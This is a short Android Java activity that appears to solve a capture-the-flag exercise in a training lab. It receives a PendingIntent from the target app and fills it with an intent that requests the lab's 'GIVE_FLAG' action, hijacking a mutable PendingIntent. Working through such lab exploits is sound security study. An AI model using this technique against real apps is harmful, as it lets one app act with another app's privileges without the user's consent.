package com.hextree.getflag;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class PendingIntentFlag23 extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = getIntent();
        PendingIntent pendingIntent = intent.getParcelableExtra("pending_intent");
        try {
            Intent mutableIntent = new Intent();
            mutableIntent.setAction("io.hextree.attacksurface.GIVE_FLAG");
            mutableIntent.putExtra("code", 42);
            pendingIntent.send(this, 0, mutableIntent);
        } catch (PendingIntent.CanceledException e) {
            throw new RuntimeException(e);
        }
    }
}